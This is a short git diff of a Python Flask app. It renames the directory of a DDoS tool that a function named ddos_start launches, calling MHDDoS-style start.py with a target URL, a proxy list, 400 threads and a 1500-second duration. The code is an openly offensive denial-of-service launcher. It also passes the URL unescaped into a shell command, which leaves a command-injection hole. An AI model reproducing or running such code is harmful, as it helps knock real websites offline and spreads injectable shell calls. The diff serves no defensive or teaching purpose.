@@ -8,7 +8,7 @@ app = Flask(__name__)
   
 def ddos_start(url):
   s= 1500
-  subprocess.call(f'python3 ~/MHDDoS/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
+  subprocess.call(f'python3 ~/Bhai/start.py GET {url} 1 400 mhddos_proxy/list 10000 {s}', stdout=subprocess.PIPE, shell=True)
 
   
 
